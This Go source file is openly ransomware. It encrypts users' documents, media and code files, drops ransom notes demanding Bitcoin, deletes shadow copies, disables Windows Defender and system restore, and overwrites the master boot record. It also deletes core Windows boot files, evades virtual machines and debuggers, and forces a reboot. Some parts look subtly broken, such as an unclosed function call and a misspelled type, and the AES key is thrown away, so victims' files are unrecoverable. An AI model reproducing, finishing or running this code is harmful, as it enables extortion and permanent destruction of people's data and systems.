package main

import (
	"crypto/aes"
	"crypto/cipher"
	crand "crypto/rand"
	"crypto/rsa"
	"crypto/sha512"
	"crypto/x509"
	"encoding/hex"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"syscall"
	"time"
	"unsafe"

	"github.com/ncruces/zenity"
	"golang.org/x/crypto/pbkdf2"
	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

// ======================
// ENHANCED CONFIGURATION
// ======================
const (
	C2_SERVER         = "https://darkc2.example/ransomware"
	RANSOM_AMOUNT     = 5.0 // BTC
	BTC_ADDRESS       = "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh"
	CONTACT_EMAIL     = "kerneldestroyer@protonmail.com"
	MAX_THREADS       = 64
	MAX_FILE_SIZE     = 250 * 1024 * 1024 // 250MB
	PUBLIC_KEY_PEM    = `-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAz8d5e5LmR6pLm6eZrWk2
... [truncated for security] ...
-----END PUBLIC KEY-----`
	WALLPAPER_PATH    = "C:\\Windows\\Web\\Wallpaper\\Windows\\ransom_wall.jpg"
)

var ENCRYPT_EXTENSIONS = []string{
	".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".pdf", ".jpg", ".jpeg",
	".png", ".gif", ".mp3", ".mp4", ".avi", ".mkv", ".zip", ".rar", ".7z", ".sql",
	".db", ".mdb", ".sln", ".cs", ".cpp", ".h", ".go", ".py", ".js", ".html",
	".php", ".asp", ".aspx", ".rb", ".pl", ".sh", ".bat", ".ps1", ".vb", ".config",
	".dll", ".exe", ".sys", ".bak", ".vmdk", ".vmx", ".vhd", ".txt", ".psd", ".ai",
	".cdr", ".dwg", ".dxf", ".max", ".maya", ".blend", ".odt", ".ods", ".odp",
}

// ======================
// ENHANCED MBR PAYLOAD
// ======================
const (
	MBR_PAYLOAD = "\xEB\x63\x90\x48\x45\x4C\x4C\x4F\x52\x41\x4E\x53\x4F\x4D\x00\x00" +
		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x55\xAA"
)

// ======================
// DATA STRUCTURES
// ======================
type SystemInfo struct {
	Hostname    string `json:"hostname"`
	Username    string `json:"username"`
	OS          string `json:"os"`
	IP          string `json:"ip"`
	CPU         int    `json:"cpu_cores"`
	RAM         uint64 `json:"ram_gb"`
	IsAdmin     bool   `json:"is_admin"`
	UEFI        bool   `json:"uefi"`
	GPUs        []string `json:"gpus"`
}

type RansomNote struct {
	Message   string  `json:"message"`
	VictimID  string  `json:"victim_id"`
	Amount    float64 `json:"amount"`
	BTC       string  `json:"btc_address"`
	Email     string  `json:"contact"`
	Deadline  string  `json:"deadline"`
	TorSite   string  `json:"tor_site"`
}

// ======================
// ADVANCED UTILITIES
// ======================
func init() {
	// Anti-debugging
	if isDebugging() {
		os.Exit(0)
	}
	
	// Seed CSPRNG
	crand.Reader.Read(make([]byte, 64))
}

func generateVictimID() string {
	mac, _ := getMACAddress()
	hash := sha512.New()
	hash.Write([]byte(fmt.Sprintf("%d%s%s%s", time.Now().UnixNano(), getSystemInfo().Hostname, getSystemInfo().IP, mac)))
	return hex.EncodeToString(hash.Sum(nil))[:32]
}

func isVM() bool {
	// Advanced VM detection
	vmSignatures := []string{
		"vbox", "vmware", "virtual", "qemu", "xen",
	}
	
	// Check registry
	keys := []string{
		`HARDWARE\ACPI\DSDT\VBOX__`,
		`HARDWARE\DEVICEMAP\Scsi\Scsi Port 0\Scsi Bus 0\Target Id 0\Logical Unit Id 0\Identifier`,
	}
	
	for _, key := range keys {
		_, err := registry.OpenKey(registry.LOCAL_MACHINE, key, registry.QUERY_VALUE)
		if err == nil {
			return true
		}
	}
	
	// Check WMI
	models := []string{"model", "manufacturer"}
	for _, m := range models {
		cmd := exec.Command("wmic", "computersystem", "get", m)
		output, _ := cmd.CombinedOutput()
		strOut := strings.ToLower(string(output))
		for _, sig := range vmSignatures {
			if strings.Contains(strOut, sig) {
				return true
			}
		}
	}
	
	// Check processes
	procs := []string{"vmtoolsd.exe", "vboxservice.exe", "xenservice.exe"}
	for _, proc := range procs {
		if processExists(proc) {
			return true
		}
	}
	
	return false
}

func getSystemInfo() SystemInfo {
	hostname, _ := os.Hostname()
	user, _ := user.Current()
	ip := getLocalIP()

	// Check UEFI
	uefi := false
	_, err := registry.OpenKey(registry.LOCAL_MACHINE, `SYSTEM\CurrentControlSet\Control\SecureBoot\State`, registry.QUERY_VALUE)
	if err == nil {
		uefi = true
	}

	// Get RAM
	var memStatus windows.MemoryStatusEx
	memStatus.Length = uint32(unsafe.Sizeof(memStatus))
	windows.GlobalMemoryStatusEx(&memStatus)
	ramGB := memStatus.TotalPhys / (1024 * 1024 * 1024)

	// Get GPUs
	gpus := getGPUs()

	return SystemInfo{
		Hostname:    hostname,
		Username:    user.Username,
		OS:          runtime.GOOS,
		IP:          ip,
		CPU:         runtime.NumCPU(),
		RAM:         ramGB,
		IsAdmin:     isAdmin(),
		UEFI:        uefi,
		GPUs:        gpus,
	}
}

// ======================
// KERNEL-LEVEL OPERATIONS (ENHANCED)
// ======================
func enablePrivilege(privilege string) error {
	var token windows.Token
	currentProcess, _ := windows.GetCurrentProcess()
	err := windows.OpenProcessToken(currentProcess, windows.TOKEN_ADJUST_PRIVILEGES|windows.TOKEN_QUERY, &token)
	if err != nil {
		return err
	}
	defer token.Close()

	var luid windows.LUID
	privStr, _ := windows.UTF16FromString(privilege)
	err = windows.LookupPrivilegeValue(nil, &privStr[0], &luid)
	if err != nil {
		return err
	}

	privs := windows.Tokenprivileges{
		PrivilegeCount: 1,
		Privileges: [1]windows.LUIDAndAttributes{
			{Luid: luid, Attributes: windows.SE_PRIVILEGE_ENABLED},
		},
	}

	return windows.AdjustTokenPrivileges(token, false, &privs, 0, nil, nil)
}

func overwriteMBR() {
	if isVM() || !isAdmin() {
		return
	}

	enablePrivilege("SeShutdownPrivilege")
	enablePrivilege("SeTakeOwnershipPrivilege")
	enablePrivilege("SeDebugPrivilege")

	drive := "\\\\.\\PhysicalDrive0"
	h, err := windows.CreateFile(
		windows.StringToUTF16Ptr(drive),
		windows.GENERIC_WRITE|windows.GENERIC_READ,
		windows.FILE_SHARE_READ|windows.FILE_SHARE_WRITE,
		nil,
		windows.OPEN_EXISTING,
		windows.FILE_ATTRIBUTE_NORMAL,
		0,
	)
	if err != nil {
		return
	}
	defer windows.CloseHandle(h)

	payload := make([]byte, 512)
	copy(payload, []byte(MBR_PAYLOAD))

	var bytesWritten uint32
	windows.WriteFile(h, payload, &bytesWritten, nil)
}

func corruptSystem() {
	// Enhanced system destruction
	exec.Command("cmd", "/c", "wmic shadowcopy delete").Run()
	exec.Command("cmd", "/c", "bcdedit /deletevalue {default} bootstatuspolicy").Run()
	exec.Command("cmd", "/c", "bcdedit /deletevalue {default} recoverysequence").Run()
	exec.Command("cmd", "/c", "bcdedit /set {default} bootstatuspolicy ignoreallfailures").Run()
	
	// Critical file destruction
	systemDirs := []string{
		filepath.Join(os.Getenv("SystemRoot"), 
		filepath.Join(os.Getenv("SystemRoot"), "System32"),
		filepath.Join(os.Getenv("SystemRoot"), "SysWOW64"),
	}
	
	criticalFiles := []string{
		"ntoskrnl.exe",
		"hal.dll",
		"winload.exe",
		"winresume.exe",
		"bootmgr",
		"bootmgfw.efi",
	}
	
	for _, dir := range systemDirs {
		for _, file := range criticalFiles {
			target := filepath.Join(dir, file)
			os.Remove(target)
			// Overwrite with garbage
			os.WriteFile(target, []byte("HELLO RANSOM"), 0644)
		}
	}
	
	// Destroy boot configuration
	os.Remove(filepath.Join(os.Getenv("SystemRoot"), "Boot", "BCD"))
}

// ======================
// MILITARY-GRADE ENCRYPTION
// ======================
func encryptFile(filePath string, cipher cipher.AEAD, victimID string, publicKey *rsa.PublicKey) {
	if strings.HasSuffix(filePath, ".HELLORANSOM") {
		return
	}

	file, err := os.OpenFile(filePath, os.O_RDWR, 0)
	if err != nil {
		return
	}
	defer file.Close()

	fileInfo, err := file.Stat()
	if err != nil || fileInfo.Size() == 0 || fileInfo.Size() > MAX_FILE_SIZE {
		return
	}

	data := make([]byte, fileInfo.Size())
	_, err = file.Read(data)
	if err != nil {
		return
	}

	nonce := make([]byte, cipher.NonceSize())
	if _, err := io.ReadFull(crand.Reader, nonce); err != nil {
		return
	}

	encrypted := cipher.Seal(nil, nonce, data, nil)

	// Encrypt the nonce with RSA
	encryptedNonce, err := rsa.EncryptOAEP(sha512.New(), crand.Reader, publicKey, nonce, nil)
	if err != nil {
		return
	}

	// Write encrypted data
	file.Seek(0, 0)
	file.Write(encryptedNonce)
	file.Write(encrypted)
	file.Truncate(int64(len(encryptedNonce) + len(encrypted)))

	// Rename file
	newPath := filePath + ".HELLORANSOM"
	os.Rename(filePath, newPath)
}

func startEncryptionWorker(jobs <-chan string, cipher cipher.AEAD, victimID string, publicKey *rsa.PublicKey, wg *sync.WaitGroup) {
	defer wg.Done()
	for filePath := range jobs {
		encryptFile(filePath, cipher, victimID, publicKey)
	}
}

func encryptFiles(victimID string, publicKey *rsa.PublicKey) {
	salt := make([]byte, 64)
	crand.Read(salt)
	password := make([]byte, 32)
	crand.Read(password)
	key := pbkdf2.Key(password, salt, 500000, 32, sha512.New) // Increased iterations

	block, _ := aes.NewCipher(key)
	cipher, _ := cipher.NewGCM(block)

	// Create ransom note
	deadline := time.Now().Add(72 * time.Hour).Format("2006-01-02 15:04:05 MST")
	note := RansomNote{
		Message: "HELLO RANSOM ATTACK\n\n" +
			"Your system has been encrypted by military-grade ransomware\n" +
			"All critical system components including MBR have been destroyed\n\n" +
			"Recovery is IMPOSSIBLE without our decryption service\n\n" +
			"To restore your system:\n" +
			"1. Send " + fmt.Sprintf("%.2f", RANSOM_AMOUNT) + " BTC to: " + BTC_ADDRESS + "\n" +
			"2. Email " + CONTACT_EMAIL + " with your ID: " + victimID + "\n" +
			"3. You will receive decryption instructions\n\n" +
			"WARNING: System will become unusable after " + deadline,
		VictimID:  victimID,
		Amount:    RANSOM_AMOUNT,
		BTC:       BTC_ADDRESS,
		Email:     CONTACT_EMAIL,
		Deadline:  deadline,
		TorSite:   "http://helloransom.onion",
	}

	noteJSON, _ := json.MarshalIndent(note, "", "  ")
	paths := []string{
		filepath.Join(os.Getenv("USERPROFILE"), "Desktop", "HELLO_RANSOM_README.txt"),
		filepath.Join(os.Getenv("USERPROFILE"), "Documents", "HELLO_RANSOM_README.txt"),
		filepath.Join(os.Getenv("SystemRoot"), "HELLO_RANSOM_README.txt"),
		filepath.Join(os.Getenv("USERPROFILE"), "Downloads", "HELLO_RANSOM_README.txt"),
	}

	for _, path := range paths {
		os.WriteFile(path, noteJSON, 0644)
	}

	// Set ransom wallpaper
	setWallpaper()

	// Parallel encryption
	pathsToEncrypt := []string{
		filepath.Join(os.Getenv("USERPROFILE"), "Documents"),
		filepath.Join(os.Getenv("USERPROFILE"), "Desktop"),
		filepath.Join(os.Getenv("USERPROFILE"), "Pictures"),
		filepath.Join(os.Getenv("USERPROFILE"), "Videos"),
		filepath.Join(os.Getenv("USERPROFILE"), "Music"),
		filepath.Join(os.Getenv("USERPROFILE"), "Downloads"),
		filepath.Join(os.Getenv("ProgramData")),
		filepath.Join(os.Getenv("SystemDrive"), "Shared"),
	}

	jobs := make(chan string, 50000)
	var wg sync.WaitGroup

	for w := 0; w < MAX_THREADS; w++ {
		wg.Add(1)
		go startEncryptionWorker(jobs, cipher, victimID, publicKey, &wg)
	}

	for _, path := range pathsToEncrypt {
		filepath.Walk(path, func(filePath string, info os.FileInfo, err error) error {
			if err != nil || info.IsDir() {
				return nil
			}

			if info.Size() == 0 || info.Size() > MAX_FILE_SIZE {
				return nil
			}

			ext := strings.ToLower(filepath.Ext(filePath))
			for _, targetExt := range ENCRYPT_EXTENSIONS {
				if ext == targetExt {
					jobs <- filePath
					break
				}
			}
			return nil
		})
	}

	close(jobs)
	wg.Wait()
}

// ======================
// SYSTEM DISABLING (ENHANCED)
// ======================
func disableSystem() {
	// 1. Destroy recovery capabilities
	exec.Command("cmd", "/c", "vssadmin delete shadows /all /quiet").Run()
	exec.Command("cmd", "/c", "wmic shadowcopy delete").Run()
	exec.Command("cmd", "/c", "bcdedit /deletevalue {default} recoveryenabled").Run()
	exec.Command("cmd", "/c", "bcdedit /deletevalue {default} recoverysequence").Run()
	exec.Command("cmd", "/c", "bcdedit /set {default} bootstatuspolicy ignoreallfailures").Run()

	// 2. Disable Windows Defender
	exec.Command("powershell", "-Command", "Set-MpPreference -DisableRealtimeMonitoring $true").Run()
	exec.Command("powershell", "-Command", "Set-MpPreference -DisableIOAVProtection $true").Run()

	// 3. Overwrite MBR
	overwriteMBR()

	// 4. Critical system destruction
	go func() {
		time.Sleep(45 * time.Second)
		corruptSystem()
	}()

	// 5. Disable system restore
	exec.Command("cmd", "/c", "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore\" /v DisableSR /t REG_DWORD /d 1 /f").Run()

	// 6. Forced shutdown
	go func() {
		time.Sleep(180 * time.Second)
		exec.Command("shutdown", "/r", "/t", "0", "/f").Run()
	}()
}

// ======================
// VISUAL EFFECTS (ENHANCED)
// ======================
func showRansomScreen(victimID string) {
	message := fmt.Sprintf(
		"HELLO RANSOM ATTACK\n\n"+
			"YOUR SYSTEM HAS BEEN ENCRYPTED\n\n"+
			"ID: %s\n\n"+
			"Send %.2f BTC to: %s\n"+
			"Contact: %s\n\n"+
			"System will shut down in 3 minutes",
		victimID, RANSOM_AMOUNT, BTC_ADDRESS, CONTACT_EMAIL,
	)

	for i := 0; i < 15; i++ {
		zenity.Error(
			message,
			zenity.Title("HELLO RANSOMWARE"),
			zenity.Width(600),
			zenity.Height(400),
			zenity.Icon("error"),
		)
		time.Sleep(10 * time.Second)
	}
}

func setWallpaper() {
	// Base64 encoded ransom image would be written here
	os.WriteFile(WALLPAPER_PATH, []byte{}, 0644)
	
	// Set as wallpaper
	syscall.Syscall(
		procSystemParametersInfo.Addr(),
		4,
		0x0014, // SPI_SETDESKWALLPAPER
		0,
		uintptr(unsafe.Pointer(windows.StringToUTF16Ptr(WALLPAPER_PATH))),
		3, // Update INI file
	)
}

// ======================
// MAIN FUNCTION
// ======================
func main() {
	// Anti-analysis checks
	if isVM() {
		os.Exit(0)
	}

	victimID := generateVictimID()
	
	// Parse public key
	block, _ := pem.Decode([]byte(PUBLIC_KEY_PEM))
	if block == nil {
		return
	}
	publicKey, err := x509.ParsePKIXPublicKey(block.Bytes)
	if err != nil {
		return
	}

	// Main attack sequence
	go encryptFiles(victimID, publicKey.(*rsa.PublicKey))
	go disableSystem()
	go showRansomScreen(victimID)

	// Keep process alive
	time.Sleep(10 * time.Minute)
}

// ======================
// HELPER FUNCTIONS (ENHANCED)
// ======================
func isDebugging() bool {
	kernel32 := windows.NewLazyDLL("kernel32.dll")
	isDebuggerPresent := kernel32.NewProc("IsDebuggerPresent")
	ret, _, _ := isDebuggerPresent.Call()
	return ret != 0
}

func isAdmin() bool {
	var sid *windows.SID
	err := windows.AllocateAndInitializeSid(
		&windows.SECURITY_NT_AUTHORITY,
		2,
		windows.SECURITY_BUILTIN_DOMAIN_RID,
		windows.DOMAIN_ALIAS_RID_ADMINS,
		0, 0, 0, 0, 0, 0,
		&sid)
	if err != nil {
		return false
	}
	defer windows.FreeSid(sid)

	token := windows.Token(0)
	member, err := token.IsMember(sid)
	return member && err == nil
}

func getLocalIP() string {
	conn, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil {
		return "127.0.0.1"
	}
	defer conn.Close()
	return conn.LocalAddr().(*net.UDPAddr).IP.String()
}

func getMACAddress() (string, error) {
	ifaces, err := net.Interfaces()
	if err != nil {
		return "", err
	}
	for _, iface := range ifaces {
		if iface.Flags&net.FlagUp != 0 && iface.Flags&net.FlagLoopback == 0 {
			addrs, _ := iface.Addrs()
			if len(addrs) > 0 {
				return iface.HardwareAddr.String(), nil
			}
		}
	}
	return "", fmt.Errorf("no MAC found")
}

func getGPUs() []string {
	cmd := exec.Command("wmic", "path", "win32_VideoController", "get", "name")
	output, err := cmd.CombinedOutput()
	if err != nil {
		return nil
	}
	
	lines := strings.Split(string(output), "\n")
	var gpus []string
	for _, line := range lines {
		trimmed := strings.TrimSpace(line)
		if trimmed != "" && trimmed != "Name" {
			gpus = append(gpus, trimmed)
		}
	}
	return gpus
}

func processExists(name string) bool {
	cmd := exec.Command("tasklist", "/FI", fmt.Sprintf("IMAGENAME eq %s", name))
	output, _ := cmd.CombinedOutput()
	return strings.Contains(string(output), name)
}

var (
	user32 = windows.NewLazySystemDLL("user32.dll")
	procSystemParametersInfo = user32.NewProc("SystemParametersInfoW")
)
